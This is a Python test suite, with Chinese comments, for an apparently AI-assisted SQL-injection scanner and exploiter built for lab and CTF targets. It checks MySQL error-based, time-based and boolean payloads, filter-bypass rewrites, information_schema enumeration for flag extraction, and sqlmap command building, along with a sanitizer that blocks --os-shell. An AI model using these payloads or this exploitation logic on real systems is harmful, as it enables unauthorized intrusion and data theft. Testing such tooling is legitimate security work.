    # ---- ③ 受控时间对判据 ----
    check("真值 3.2s / 假值 0.1s → 命中",
          prober._controlled_time_hit(3.2, 0.1, 3)[0] is True)
    check("两者都未休眠 → 不命中",
          prober._controlled_time_hit(0.6, 0.5, 3)[0] is False)
    check("差 1.1s（不足 1.8s 阈值）→ 不命中",
          prober._controlled_time_hit(2.0, 0.9, 3)[0] is False)
    check("双慢且接近（限流抖动）→ 不命中",
          prober._controlled_time_hit(3.0, 2.9, 3)[0] is False)

    # ---- ④ 受控时间对 = 强证据（单向量确认）----
    check("受控时间对命中 → 强证据",
          prober._has_strong_evidence([{"vector": "time", "controlled": True}]) is True)
    check("非受控 time 命中 → 非强证据（仍需第二向量）",
          prober._has_strong_evidence([{"vector": "time",
                                        "criteria": "时延 3.0s"}]) is False)


def _blind_flag_tests():
    """2026-10-23 hbc2:23201：纯时间盲注靶的 flag 直取基础能力。"""
    import inspect
    from app.services import blind_extract as be

    p = be.build_payload("1", "1=1", "mysql", quote='"', sec=1)
    check("双引号语境时间 payload（sqlmap 跑不完时的快路径）",
          p.startswith('1" AND IF(') and "SLEEP(1)" in p, f"({p})")
    p2 = be.build_payload("1", "1=1", "mysql", quote="'", sec=2)
    check("单引号语境保持不变", p2.startswith("1' AND IF(") and "SLEEP(2)" in p2, f"({p2})")
    check("列名评分：flag 列 > 普通列",
          be._score_column("flag", "flag") > be._score_column("users", "id"))
    check("列名评分：secret 表 > 普通表",
          be._score_column("secrets", "content") > be._score_column("users", "username"))
    check("flag 直取只读且查 information_schema",
          "information_schema.columns" in be._COLS_EXPR_MYSQL
          and "group_concat" in be._COLS_EXPR_MYSQL
          and "group_concat" in inspect.getsource(be.extract_flag_blind))
    check("_Prober 支持闭合符参数",
          "quote" in inspect.signature(be._Prober.__init__).parameters)


def _review_progress_tests():
    """复核队列计数与进度刷新（2026-10-24 两个显示 bug 的回归检查）。"""
    import inspect
    from app.api import ai as ai_api

    q_src = inspect.getsource(ai_api.review_queue)
    check("队列 total 先扣除已复核再计数", "~RiskAssessment.id.in_(reviewed)" in q_src)
    r_src = inspect.getsource(ai_api._refresh_review_progress)
    check("复核后刷新任务进度", "复核完成，可恢复扫描" in r_src)
    check("submit_review 调用进度刷新",
          "_refresh_review_progress" in inspect.getsource(ai_api.submit_review))


def _scope_normalize_tests():
    """授权范围值归一：误填 URL/端口时也要能匹配到目标主机。"""
    from app.api.task import normalize_scope_value as n

    check("URL 去协议/端口/斜杠", n("http://127.0.0.1:8899/") == "127.0.0.1",
          f"({n('http://127.0.0.1:8899/')!r})")
    check("HTTPS 去协议并小写", n("https://Example.com/path") == "example.com")
    check("裸 host:port 去端口", n("10.0.0.5:8080") == "10.0.0.5")
    check("通配符保留并小写", n("*.Example.com") == "*.example.com")
    check("普通域名不变", n("  Example.com  ") == "example.com")
    check("IPv6 方括号不拆", n("[::1]") == "[::1]")
    check("空值返回空", n("   ") == "")


def _ai_test_route_tests():
    """AI 连通性测试路由：存在、请求模型可用、走标准 chat/completions。"""
    import inspect
    from app.api import settings as settings_api

    paths = {getattr(r, "path", "") for r in settings_api.router.routes}
    check("POST /api/settings/test-ai 路由已注册",
          "/api/settings/test-ai" in paths)
    check("TestAIReq 支持三个可选字段",
          {"base_url", "api_key", "model"} <= set(
              settings_api.TestAIReq.model_fields.keys()))
    src = inspect.getsource(settings_api.test_ai)
    check("测试连接走 /chat/completions", "/chat/completions" in src)
    check("测试连接失败也返回可读错误（不吞异常）", "elapsed_ms" in src and "hint" in src)


def _log_clear_tests():
    """日志清空：进程内历史可清空（SSE 重连不再回放），且按任务过滤。"""
    from app.services.event_bus import EventBus

    b = EventBus(max_history=10)
    b.publish("scan", "a", task_id=1)
    b.publish("scan", "b", task_id=2)
    b.publish("system", "c", task_id=None)
    check("清空指定任务只清该任务", b.clear(task_id=1) == 1 and len(b.recent(10)) == 2)
    check("系统级日志不被任务级清空误删",
          any(e["task_id"] is None for e in b.recent(10)))
    check("清空全部", b.clear() == 2 and b.recent(10) == [])

    from app.api import scan as scan_api
    paths = {getattr(r, "path", "") for r in scan_api.router.routes}
    check("POST /api/scan/logs/clear 路由已注册", "/api/scan/logs/clear" in paths)


def _audit_clear_tests():
    """审计日志页「清空日志」：purge 支持 all，且动作本身会留一条新记录。"""
    import inspect
    from app.api import audit as audit_api

    check("AuditPurgeReq 支持 all", audit_api.AuditPurgeReq(all=True).all is True)
    check("purge 有全量分支",
          "if req.all:" in inspect.getsource(audit_api.purge_audit_logs))
    check("清空动作仍落审计（新链起点）",
          "audit_purge" in inspect.getsource(audit_api.purge_audit_logs))
    paths = {getattr(r, "path", "") for r in audit_api.router.routes}
    check("POST /api/audit/purge 路由已注册", "/api/audit/purge" in paths)


def _confirmed_payload_tests():
    """人工确认 payload 导入：存储、语境反推、受控假值。"""
    import inspect
    from app.services import prober
    from app.api import collect as collect_api
    from app.core.database import Base

    check("confirmed_payloads 表已注册", "confirmed_payloads" in Base.metadata.tables)
    paths = {getattr(r, "path", "") for r in collect_api.router.routes}
    check("POST /endpoints/{id}/confirmed-payload 路由已注册",
          "/api/collect/endpoints/{endpoint_id}/confirmed-payload" in paths)

    # 用户实测 payload：错误型 + 逻辑闭合
    p = ("zhangsan'and(updatexml(1,concat(0x7e,database(),0x7e),1))"
         "and'1'='1")
    check("错误回显 payload 被识别为强证据",
          prober._error_echo_hit("XPATH syntax error: '~sql_injection_lab~'", p, "")
          == "sql_injection_lab")
    check("布尔 payload 翻转条件（括号形态）",
          prober._flip_confirmed("zhangsan'and(1=1)and'1'='1")
          == "zhangsan'and(1=2)and'1'='1")
    check("逻辑闭合翻转（保留闭合为真）",
          prober._flip_confirmed("zhangsan'and(updatexml(1,1,1))and'1'='1")
          == "zhangsan'and(updatexml(1,1,1))and'1'='2")
    check("十六进制比较翻转",
          prober._flip_confirmed("x'and(0x31=0x31)and'1'='1")
          == "x'and(0x31=0x32)and'1'='1")
    check("无可翻转条件返回 None", prober._flip_confirmed("1' or 1-- ") is None)
    check("探测器优先复测人工 payload",
          "ConfirmedPayload" in inspect.getsource(prober.probe_endpoint))


def _error_extract_tests():
    """错误回显直取：零分隔 payload、SELECT 双写、空格替换、候选表/列选择。"""
    from app.services import error_extract as ee

    p = ee.build_echo_payload("zhangsan'", "database()")
    check("错误回显 payload 零空格零注释",
          " " not in p and "--" not in p and "/**/" not in p, f"({p})")
    check("错误回显 payload 结构正确",
          p == "zhangsan'and(updatexml(1,concat(0x7e,(database()),0x7e),1))and'1'='1",
          f"({p})")

    expr = ("select group_concat(table_name) from information_schema.tables "
            "where table_schema=database()")
    rw = ee.rewrite_mysql_filters(expr, "\n")
    check("SELECT 混写为 SeLeCt（躲过大小写两种过滤）",
          rw.count("SeLeCt") == 1 and "select" not in rw and "SELECT" not in rw,
          f"({rw[:30]!r})")
    check("模拟小写过滤不改变混写形态", rw.replace("select", "") == rw)
    check("模拟大写过滤不改变混写形态", rw.replace("SELECT", "") == rw)
    check("空格被换行替换（只保留换行分隔）", " " not in rw and "\n" in rw, f"({rw!r})")
    for z in (ee._TABLES_ZERO, ee._COLS_ZERO.format(t="flag"),
              ee._VAL_ZERO.format(c="flag", t="flag")):
        check(f"零空白表达式无空白/混写 SELECT: {z[:40]}",
              " " not in z and "\n" not in z and "\t" not in z
              and "SeLeCt" in z and "from`" in z)
    check("候选选择：优先 flag/secret",
          ee.pick_candidate(["users", "flag", "notice"], ee._FLAG_KEYWORDS) == "flag")
    check("候选选择：无关键词取最后一个",
          ee.pick_candidate(["a", "b"], ee._FLAG_KEYWORDS) == "b")
    check("空清单返回 None", ee.pick_candidate([], ee._FLAG_KEYWORDS) is None)


def _nosep_tests():
    """2026-10-23 hbc2:35940：过滤空格/+//**//注释时，零分隔逻辑闭合与错误型回显。"""
    import inspect
    from app.services import prober

    def nosep(p):
        return (" " not in p and "/**/" not in p and "--" not in p and "#" not in p
                and "+" not in p.replace("++", ""))

    for true_tpl, false_tpl in prober._NOSEP_BOOL_TEMPLATES:
        pt = true_tpl.format(v="zhangsan")
        pf = false_tpl.format(v="zhangsan")
        # 只翻转条件本身（首个出现），末尾 `'1'='1` 的逻辑闭合必须保持为真
        if "0x31=0x31" in pt:
            expected = pt.replace("0x31=0x31", "0x31=0x32", 1)
        else:
            expected = pt.replace("1=1", "1=2", 1)
        check(f"零分隔布尔对同构: {pt[:32]}", expected == pf,
              f"(true={pt!r} false={pf!r})")
        check(f"零分隔布尔对不含空格/注释: {pt[:24]}", nosep(pt), f"({pt})")
        check(f"假值同构不含空格/注释: {pf[:24]}", nosep(pf), f"({pf})")

    for tpl in prober._NOSEP_ERROR_TEMPLATES:
        pe = tpl.format(v="zhangsan")
        check(f"错误型零分隔: {pe[:36]}", nosep(pe), f"({pe})")

    # 回显判据：updatexml 的 `~db~` 命中；基线已有则不算
    hit = prober._error_echo_hit(
        "XPATH syntax error: '~sql_injection_lab~'",
        "zhangsan'and(updatexml(1,concat(0x7e,database(),0x7e),1))and'1'='1", "")
    check("updatexml 的 ~db~ 回显识别为强证据", hit == "sql_injection_lab", f"({hit})")
    check("基线上已存在的 ~...~ 不算命中",
          prober._error_echo_hit("x ~abc~ y", "updatexml(1,1,1)", "~abc~") is None)
    check("非错误型 payload 不启用回显判据",
          prober._error_echo_hit("~abc~", "1'and(1=1)and'1'='1", "") is None)

    src = inspect.getsource(prober.probe_endpoint)
    check("主流程无命中时执行零分隔探针",
          "_NOSEP_BOOL_TEMPLATES" in src and "_NOSEP_ERROR_TEMPLATES" in src)


def _endpoint_scan_tests():
    """手动录入后的定向重扫（不重新采集，只扫这一个接口）。"""
    import inspect
    from app.services import task_manager, pipeline
    from app.api import collect as collect_api

    check("终态 done 允许定向重扫回 scanning",
          "scanning" in task_manager._TRANSITIONS.get("done", set()))
    check("terminated 允许定向重扫回 scanning",
          "scanning" in task_manager._TRANSITIONS.get("terminated", set()))
    check("done 仍不能 restart（collecting 不在出边）",
          "collecting" not in task_manager._TRANSITIONS.get("done", set()))
    check("start_endpoint_scan 已实现",
          hasattr(task_manager, "start_endpoint_scan"))
    check("pipeline.run_endpoint_scan 已实现",
          hasattr(pipeline, "run_endpoint_scan"))
    paths = {getattr(r, "path", "") for r in collect_api.router.routes}
    check("POST /api/collect/endpoints/{id}/scan 路由已注册",
          "/api/collect/endpoints/{endpoint_id}/scan" in paths)
    src = inspect.getsource(pipeline.run_endpoint_scan)
    check("定向重扫只跑单个接口（不调用爬虫）",
          "run_scan" in src and "crawl_static" not in src)


def _followup_round_tests():
    """2026-10-15 追加轮四项结构性补丁的离线验证（不依赖 DeepSeek）。"""
    import inspect
    from app.services import ai as ai_svc
    from app.services import deep_exploit, prober
    from app.services.char_union_exploit import CharUnionExploiter

    # ---- ① 数字型成对模板（规则引擎降级路径不再漏 id=1 and 1=1）----
    for tname, tmpl in (("_BUILTIN_TEMPLATES", ai_svc._BUILTIN_TEMPLATES),
                        ("_BUILTIN_SQLITE", ai_svc._BUILTIN_SQLITE)):
        numeric = [t for t in tmpl if "and 1=1" in t[0]]
        check(f"{tname} 含数字型成对档", len(numeric) == 1,
              f"(实际 {[t[0] for t in tmpl]})")
        check(f"{tname} 数字档带 false 变体 1=2",
              bool(numeric) and numeric[0][3] and "and 1=2" in numeric[0][3],
              f"(实际 {numeric[0][3] if numeric else None!r})")

    # ---- ② 研判探针参数覆盖 [:2]→[:3]（第 3 个参数不再零证据）----
    class _MultiHandler(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            qs = dict(parse_qsl(urlparse(self.path).query, keep_blank_values=True))
            hit = any("'" in (v or "") for v in qs.values())
            payload = ({"sql": f"SELECT ... '{qs}'",
                        "error": "查询异常: unrecognized token"} if hit
                       else {"sql": "SELECT ... 1", "results": []})
            data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    srv = ThreadingHTTPServer(("127.0.0.1", 0), _MultiHandler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        ep = SimpleNamespace(
            params=[{"name": "a", "sample_value": "1", "location": "query"},
                    {"name": "b", "sample_value": "1", "location": "query"},
                    {"name": "c", "sample_value": "1", "location": "query"}],
            raw_path="/api/x", path="/api/x",
            host=f"127.0.0.1:{srv.server_address[1]}", method="GET", task_id=0)
        probes = ai_svc._collect_sqli_probes(ep)
        probed = {p.get("param") for p in probes}
        check("研判探针覆盖到第 3 个参数（[:2]→[:3]）", "c" in probed,
              f"(实际 {sorted(probed)})")
        check("前两个参数仍被覆盖", {"a", "b"} <= probed, f"(实际 {sorted(probed)})")
    finally:
        srv.shutdown()
        srv.server_close()

    # ---- ③ 深入利用：接结构化判定 + AI 可定制 prefix/suffix/technique ----
    check("_ai_next 接受 findings 参数",
          "findings" in inspect.signature(deep_exploit._ai_next).parameters)
    check("_ai_next 走 summarize_for_ai（不再喂原始 tail）",
          "summarize_for_ai" in inspect.getsource(deep_exploit._ai_next))
    check("_DEEP_SYSTEM 声明 prefix/suffix",
          "prefix" in deep_exploit._DEEP_SYSTEM and "suffix" in deep_exploit._DEEP_SYSTEM)
    check("_DEEP_SYSTEM 声明 technique", "technique" in deep_exploit._DEEP_SYSTEM)
    step_src = inspect.getsource(deep_exploit._run)
    check("step 循环把 prefix/suffix 接进 sqlmap extra",
          '"--prefix"' in step_src and '"--suffix"' in step_src)
    check("step 循环把 technique 接进 sqlmap extra", '"--technique"' in step_src)

    # ---- ④ 兄弟参数兜底 + char_union 复用列数 ----
    from app.services import scheduler
    check("scheduler 有 _record_ai_vuln 抽取",
          callable(getattr(scheduler, "_record_ai_vuln", None)))
    check("scheduler 兄弟轮改读 probe_hint（收紧门控）",
          "probe_hint" in inspect.getsource(scheduler.run_scan))
    check("probe_endpoint 接受 focus_param",
          "focus_param" in inspect.signature(prober.probe_endpoint).parameters)
    check("probe_endpoint 返回 probe_hint",
          "probe_hint" in inspect.getsource(prober.probe_endpoint))
    check("prober 导出 pick_target_param",
          callable(getattr(prober, "pick_target_param", None)))
    check("pick_target_param 优先疑似参数",
          prober.pick_target_param([{"name": "page"}, {"name": "id"}]) == "id")

    # ---- 收紧门控：只有"被探参数之外"的**可疑**兄弟才触发补探 ----
    _probes = [
        {"param": "a", "label": "baseline", "sql_error_like": False, "matched": False},
        {"param": "b", "label": "quote", "sql_error_like": True, "matched": True},
        {"param": "c", "label": "bypass_reveal", "matched": "bypass_error"},
    ]
    check("探针发现可疑兄弟 → 命中（b 报错 / c 绕过）",
          prober._suspect_siblings(_probes, "a") == ["b", "c"],
          f"(实际 {prober._suspect_siblings(_probes, 'a')})")
    check("被探参数本身可疑 → 不算兄弟", prober._suspect_siblings(_probes, "b") == ["c"])
    check("探针全干净 → 不补探（省掉一整轮）",
          prober._suspect_siblings(
              [{"param": "x", "sql_error_like": False, "matched": False},
               {"param": "y", "sql_error_like": False, "matched": False}], "x") == [])
    check("_sibling_param 已随收紧门控移除",
          not hasattr(scheduler, "_sibling_param"))

    # char_union：known_columns>0 → 跳过 ORDER BY 重测、直接采用初筛列数
    ex = CharUnionExploiter.__new__(CharUnionExploiter)      # 不走 __init__（免开 httpx）
    ex.url, ex.param, ex.base, ex.task_id = "http://127.0.0.1:9/", "name", "1", None
    ex.delay, ex.timeout = 0.0, 5.0
    ex.baseline, ex.log, ex.requests = "", [], 0
    ex.known_columns = 6
    ex._get_smart = lambda p: ((200, "error: unrecognized token")
                               if (p.endswith("'") and not p.endswith("-- "))
                               else (200, f"<html>results for {p}</html>"))
    res = ex.run()
    check("复用初筛列数：steps 标记跳过 ORDER BY",
          any("复用初筛列数=6" in s for s in res.get("steps", [])),
          f"({res.get('steps', [])[:3]})")
    # 注意：step3 的**文案**含"跳过 ORDER BY 重测"，所以只断言没有真正的 ORDER BY 探针步骤
    check("复用初筛列数：未发 ORDER BY 探针请求",
          not any(s.startswith("3) ORDER BY") for s in res.get("steps", [])),
          f"({res.get('steps', [])})")
    check("复用初筛列数：columns 直接采用初筛值",
          res.get("columns") == 6, f"(实际 {res.get('columns')})")


def _ai_breaker_tests():
    """P2 修复：显式分段超时 + 连续失败熔断 + reasoner 不下发 temperature。"""
    import time as _t
    import httpx
    import app.services.ai as _ai_mod
    from app.services import ai as ai_svc

    ai_svc._ai_breaker_reset()
    c = ai_svc.AIClient("http://127.0.0.1:1/v1", "k", "deepseek-chat")
    check("AIClient 用显式分段超时（非单浮点）", isinstance(c.timeout, httpx.Timeout),
          f"({type(c.timeout).__name__})")
    check("connect 超时 5s（快速失败）", c.timeout.connect == 5.0, f"({c.timeout.connect})")
    check("read 超时 60s", c.timeout.read == 60.0, f"({c.timeout.read})")

    check("初始未熔断", not ai_svc._ai_breaker_open())
    ai_svc._ai_breaker_note(False)
    ai_svc._ai_breaker_note(False)
    check("失败 2 次仍未熔断（阈值 3）", not ai_svc._ai_breaker_open())
    ai_svc._ai_breaker_note(False)
    check("失败 3 次 → 熔断打开", ai_svc._ai_breaker_open())

    # 熔断期间 chat_json 必须"立即"降级，不发请求（打不可达地址也不该卡）
    t0 = _t.time()
    r = c.chat_json("s", "u")
    check("熔断期间 chat_json 立即返回 None", r is None and (_t.time() - t0) < 1.0,
          f"({r}, {_t.time() - t0:.2f}s)")

    ai_svc._ai_breaker_note(True)
    check("一次成功 → 熔断复位", not ai_svc._ai_breaker_open())

    # 捕获下发 payload：reasoner 不能带 temperature
    captured: dict = {}

    class _FakeResp:
        def raise_for_status(self):
            pass

        def json(self):
            return {"choices": [{"message": {"content": '{"ok":true}'}}], "usage": {}}

    def _fake_post(url, **kw):
        captured.clear()
        captured.update(kw.get("json") or {})
        captured["__trust_env__"] = kw.get("trust_env")
        return _FakeResp()

    orig_post = _ai_mod.httpx.post
    _ai_mod.httpx.post = _fake_post
    try:
        ai_svc._ai_breaker_reset()
        ai_svc.AIClient("http://x/v1", "k", "deepseek-chat").chat_json("s", "u")
        check("chat 模型下发 temperature", "temperature" in captured, f"({list(captured)})")
        ai_svc._ai_breaker_reset()
        ai_svc.AIClient("http://x/v1", "k", "deepseek-reasoner").chat_json("s", "u")
        check("reasoner 不下发 temperature", "temperature" not in captured,
              f"({list(captured)})")
        # Windows 注册表代理关闭时，httpx trust_env=True 会 10061 拒连 →
        # AI 请求静默失败并降级规则引擎（2026-10-24 实测：所有 AI 调用其实都没发出去）。
        check("AI 请求不走系统代理（trust_env=False）",
              captured.get("__trust_env__") is False, f"({captured.get('__trust_env__')})")
    finally:
        _ai_mod.httpx.post = orig_post
        ai_svc._ai_breaker_reset()


def _ai_test_ai_tests():
    """2026-10-24：设置页「测试连接」同样必须绕开系统代理，否则永远显示连接失败。"""
    from app.api import settings as _st

    captured = {}

    class _Resp:
        status_code = 200
        text = ""

        def json(self):
            return {"choices": [{"message": {"content": '{"ok":true}'}}], "usage": {}}

    def _fake_post(url, **kw):
        captured.update(kw)
        return _Resp()

    vals = {_st.Setting.KEY_AI_BASE_URL: "http://x/v1",
            _st.Setting.KEY_AI_MODEL: "deepseek-chat",
            _st.Setting.KEY_AI_API_KEY: "k"}

    class _DB:
        def commit(self):
            pass

    import httpx as _httpx   # settings.test_ai 在函数内 import httpx → 打模块级属性
    orig_post, orig_get, orig_log = _httpx.post, _st.ai.get_setting, _st.log_action
    _httpx.post = _fake_post
    _st.ai.get_setting = lambda db, key, decrypt=False: vals.get(key, "")
    _st.log_action = lambda *a, **kw: None
    try:
        res = _st.test_ai(None, user=type("U", (), {"id": 1})(), db=_DB())
        check("测试连接返回 ok", res.get("ok") is True, f"({res.get('error')})")
        check("测试连接不走系统代理（trust_env=False）",
              captured.get("trust_env") is False, f"({captured.get('trust_env')})")
    finally:
        _httpx.post, _st.ai.get_setting, _st.log_action = orig_post, orig_get, orig_log


# ============ 2026-10-15 第二轮：sqlmap 命令构建 / POST 深入利用 / 探针闭合档 ============

def _sqlmap_cmd_tests():
    """sqlmap 命令组装（Less-12 深入利用实测暴露的 4 个缺陷）。"""
    from sqlmap_adapter import runner
    import subprocess as _sp

    # 值以 '-' 开头被吞：`--suffix '-- -'`（最常用的 MySQL 注释后缀）曾整个丢失
    got = runner._sanitize_extra_args(["--suffix", "-- -", "--technique", "B"])
    check("sanitizer 保留以 '-' 开头的值（--suffix '-- -'）",
          "--suffix" in got and got[got.index("--suffix") + 1] == "-- -", f"→ {got}")
    # 真正的缺值（下一个 token 是选项键）不能误当值吃掉
    got2 = runner._sanitize_extra_args(["--suffix", "--technique", "B"])
    check("sanitizer 下一 token 是选项键时不误当值",
          got2 == ["--suffix", "--technique", "B"], f"→ {got2}")
    check("sanitizer 仍拦破坏性参数",
          runner._sanitize_extra_args(["--os-shell", "--dbs"]) == ["--dbs"])
    check("sanitizer --dump 自动补 --stop<=5",
          runner._sanitize_extra_args(["--dump"]) == ["--dump", "--start", "1", "--stop", "5"])

    # 命令组装：POST 必须带 --method/--data；exploit 模式默认技法要含 E（报错型）
    cap = {}
    orig = _sp.Popen

    class _FP:
        def __init__(self, cmd, **kw):
            cap["cmd"] = cmd
            self.pid = 99901
            self.stdout = iter(["[INFO] x\n"])

        def wait(self, timeout=None):
            return 0

    runner.subprocess.Popen = _FP
    try:
        runner.run_sqlmap(job_id=99901, url="http://t/sqli-labs/Less-12", method="POST",
                          data="uname=1&passwd=", param="uname", exploit_mode=True,
                          extra_args=["--suffix", "-- -"], timeout_s=5)
    finally:
        runner.subprocess.Popen = orig
    cmd = cap.get("cmd", [])
    check("run_sqlmap POST 带 --method/--data",
          "--method" in cmd and "POST" in cmd and "--data" in cmd, f"→ {cmd[-10:]}")
    check("exploit_mode 默认技法含 E（报错型靶点不再被关掉）",
          "--technique=BE" in cmd, f"→ {cmd}")
    check("run_sqlmap 收到的 --suffix 值完整（未被吞）",
          "--suffix" in cmd and cmd[cmd.index("--suffix") + 1] == "-- -", f"→ {cmd[-6:]}")


def _dbms_normalize_tests():
    """`--dbms` 值归一 + exploit_mode 致命错误分类。

    现场（2026-10-15 Less-12 深入利用 job#55）：sqlmap 指纹输出 `MySQL >= 5.0` 被原样
    当 `--dbms` 传回 → sqlmap 自己的解析正则只认「库名+空格+数字」→ 匹配不上 →
    `[CRITICAL] unsupported back-end DBMS` + exit_code=1 + **零请求**；
    而分类层只看"有没有输出" → 误判 `exploit_ok`（假成功）。
    """
    from sqlmap_adapter import runner
    import subprocess as _sp

    cases = {
        "MySQL >= 5.0.12": "MySQL",
        "MySQL >= 5.0": "MySQL",
        "MariaDB >= 10.3": "MySQL",
        "PostgreSQL >= 9.6": "PostgreSQL",
        "Microsoft SQL Server 2019": "Microsoft SQL Server",
        "sqlite": "SQLite",
        "SQLite 3.45.3": "SQLite",
        "Oracle 11g": "Oracle",
    }
    for raw, want in cases.items():
        got = runner.normalize_dbms(raw)
        check(f"normalize_dbms({raw!r}) → {want}", got == want, f"→ {got!r}")
    check("normalize_dbms 认不出 → None（宁可不传，别让 sqlmap CRITICAL）",
          runner.normalize_dbms("TotallyUnknownDB 9.9") is None,
          f"→ {runner.normalize_dbms('TotallyUnknownDB 9.9')!r}")
    check("normalize_dbms(None/'') → None",
          runner.normalize_dbms(None) is None and runner.normalize_dbms("") is None)

    # sanitizer：非法 dbms 必须**整对丢弃**（只留 --dbms 不给值 → sqlmap 报缺参）
    got = runner._sanitize_extra_args(["--dbms", "MySQL >= 5.0", "--banner"])
    check("sanitizer 归一 --dbms 值并保留其余参数",
          got == ["--dbms", "MySQL", "--banner"], f"→ {got}")
    got2 = runner._sanitize_extra_args(["--dbms", "TotallyUnknownDB 9.9", "--banner"])
    check("sanitizer 认不出的 --dbms 整对丢弃", got2 == ["--banner"], f"→ {got2}")
    got3 = runner._sanitize_extra_args(["--dbms=MySQL >= 5.0"])
    check("sanitizer 支持 --dbms=<value> 内联写法", got3 == ["--dbms", "MySQL"], f"→ {got3}")

    cap = {}
    orig = _sp.Popen

    def _fake(lines, rc):
        class _FP:
            def __init__(self, cmd, **kw):
                cap["cmd"] = cmd
                self.pid = 99902
                self.stdout = iter(lines)

            def wait(self, timeout=None):
                return rc
        return _FP

    try:
        runner.subprocess.Popen = _fake(["[INFO] x\n"], 0)
        runner.run_sqlmap(job_id=99902, url="http://t/", method="GET",
                          dbms_hint="MySQL >= 5.0", timeout_s=5)
        cmd = cap.get("cmd", [])
        check("run_sqlmap 的 dbms_hint 带版本 → 下发归一值",
              "--dbms" in cmd and cmd[cmd.index("--dbms") + 1] == "MySQL", f"→ {cmd}")

        runner.subprocess.Popen = _fake(
            ["[21:30:10] [CRITICAL] you provided an unsupported back-end database "
             "management system. Supported DBMSes are as follows: MySQL, SQLite.\n"], 1)
        r = runner.run_sqlmap(job_id=99903, url="http://t/", method="GET",
                              exploit_mode=True, extra_args=["--dbs"], timeout_s=5)
        check("exploit_mode 下 [CRITICAL] 零执行 → error（不再假报 exploit_ok）",
              r["result_class"] == "error", f"→ {r['result_class']}")

        runner.subprocess.Popen = _fake(
            ["[INFO] fetching current database\navailable databases [2]:\n"
             "[*] security\n[*] test\n"], 0)
        r2 = runner.run_sqlmap(job_id=99904, url="http://t/", method="GET",
                               exploit_mode=True, extra_args=["--dbs"], timeout_s=5)
        check("exploit_mode 有产出仍判 exploit_ok",
              r2["result_class"] == "exploit_ok", f"→ {r2['result_class']}")
    finally:
        runner.subprocess.Popen = orig


def _deep_plan_precedence_tests():
    """深入利用：证据(derived_ps) 优先于 AI 猜测；AI 的 technique 只能放宽不能收窄。

    现场（2026-10-15 Less-12 step2）：AI 给的 prefix 是**整条 payload**
    （`1") OR NOT 3943=3943#`）而非注入上下文，把实证有效的 `uname=1")` 覆盖掉
    → sqlmap 重测判"不可注入"，枚举中断在 tables 一步。
    """
    from app.services import deep_exploit as de

    derived = ('uname=1")', "-- -")
    got = de._pick_prefix_suffix({"prefix": '1") OR NOT 3943=3943#', "suffix": ""}, derived)
    check("有实证前缀时忽略 AI 的 prefix", got == derived, f"→ {got}")
    got2 = de._pick_prefix_suffix({"prefix": "1'", "suffix": "-- -"}, None)
    check("无实证时退回 AI 的 prefix/suffix", got2 == ("1'", "-- -"), f"→ {got2}")
    check("无实证且 AI 也没给 → (None, None)",
          de._pick_prefix_suffix({}, None) == (None, None))

    check("AI 给 B → 并集 BE（不丢报错型）", de._widen_technique("B") == "BE",
          f"→ {de._widen_technique('B')}")
    check("AI 给 U → 并集 BEU", de._widen_technique("U") == "BEU",
          f"→ {de._widen_technique('U')}")
    check("AI 给 BEUSTQ 原样", de._widen_technique("BEUSTQ") == "BEUSTQ")
    check("AI 未给 → None（走 runner 默认 BE）", de._widen_technique(None) is None)
    check("非法技法 → None", de._widen_technique("XYZ") is None)
    # 时间盲注：payload 含 SLEEP/BENCHMARK/pg_sleep → 自动补 T（Less-16 实测）
    check("时间盲注 payload → 补 T（AI 未给技法）",
          de._widen_technique(None, '1") AND (SELECT 8165 FROM (SELECT(SLEEP(5)))nuzY)')
          == "BET")
    check("时间盲注 payload → AI 给 B 也补 T",
          de._widen_technique("B", "AND pg_sleep(3)") == "BET")
    check("非时间 payload 不补 T",
          de._widen_technique("U", "1' union select 1,2") == "BEU")


def _union_criteria_tests():
    """UNION 判据只认「列数不匹配」类**语义**错误，不认泛化的**解析**错误。

    现场（2026-10-15 Less-13）：靶场是 `username=('$v')`（`')` 语境），探针发
    `1' union select …` → 括号不配平 → MySQL 报 `you have an error in your sql syntax`。
    旧实现把它记为「UNION 触发报错（语句已被执行）」并据此确认漏洞；可深入利用时
    sqlmap 又判「不可注入」——前后自相矛盾。解析错误只说明引号破坏了原查询，
    那正是**语境不匹配**的症状，不是 UNION 成功的证据。
    """
    import inspect
    from app.services import prober
    from app.services import deep_exploit as de

    parse_err = ("you have an error in your sql syntax; check the manual that "
                 "corresponds to your MySQL server version")
    check("泛化解析错误不算 UNION 命中",
          prober._match_error_keyword(parse_err, prober._UNION_ERROR_KEYWORDS) is None,
          f"→ {prober._match_error_keyword(parse_err, prober._UNION_ERROR_KEYWORDS)}")
    check("MySQL 列数不匹配算 UNION 命中",
          prober._match_error_keyword(
              "ERROR 1222 (21000): The used SELECT statements have a "
              "different number of columns", prober._UNION_ERROR_KEYWORDS) is not None)
    check("SQLite 列数不匹配算 UNION 命中",
          prober._match_error_keyword(
              "SELECTs to the left and right of UNION do not have the same "
              "number of result columns", prober._UNION_ERROR_KEYWORDS) is not None)
    check("PostgreSQL 列数不匹配算 UNION 命中",
          prober._match_error_keyword("each UNION query must have the same number "
                                      "of columns", prober._UNION_ERROR_KEYWORDS) is not None)
    check("默认集合仍认泛化语法错误（error 向量要用）",
          prober._match_error_keyword(parse_err) is not None)

    # 前缀自纠（Less-13 job#94-97：4 次一字不差地带着错前缀重试）
    src = inspect.getsource(de._run)
    check("深入利用：带前缀跑空 → 下一步去掉前后缀自纠",
          "_drop_ps" in src and "_pfx = _sfx = None" in src,
          "→ _run 里应有 _drop_ps 回退")


def _parse_tables_tests():
    """`_parse_tables` 必须认得 sqlmap 真实输出（含 `+----+` 边框行）。

    现场（2026-10-15 Less-12 job#59）：sqlmap 已列出 4 张表，旧实现却返回 [] ——
    它要求 `[N tables]` 后**紧跟** `| name |`，而真实输出中间夹着边框行；
    更糟的是它**提前 return 这个空结果**，跳过了本该生效的兜底分支。
    """
    from app.services import deep_exploit as de

    real = (
        "[21:52:04] [INFO] fetching tables for database: 'security'\n"
        "[21:52:04] [INFO] retrieved: 'emails'\n"
        "Database: security\n"
        "[4 tables]\n"
        "+----------+\n"
        "| emails   |\n"
        "| referers |\n"
        "| uagents  |\n"
        "| users    |\n"
        "+----------+\n"
        "\n[*] ending @ 21:52:04 /2026-10-15/\n"
    )
